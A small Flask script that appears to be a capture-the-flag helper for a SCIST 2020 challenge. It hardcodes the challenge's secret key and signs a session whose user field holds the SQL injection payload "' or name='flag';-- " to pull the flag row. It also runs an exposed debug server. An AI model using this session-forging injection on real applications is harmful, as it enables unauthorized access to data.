from flask import (
    Flask, g, request, session,
    send_from_directory,
    render_template, redirect
)
from uuid import uuid4
import os, sqlite3
 
app = Flask(__name__)
app.secret_key = 'SCIST_2020_FINAL_CTF'
flag = os.getenv('FLAG', 'FLAG_NOT_EXIST')
 
@app.before_request
def check_session():
    if 'user' not in session:
        session['user'] ="' or name='flag';-- "

@app.route('/' )
def add():
    session['user'] = "' or name='flag';-- "

    print(session)
    return app.secret_key
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10002, debug=True)
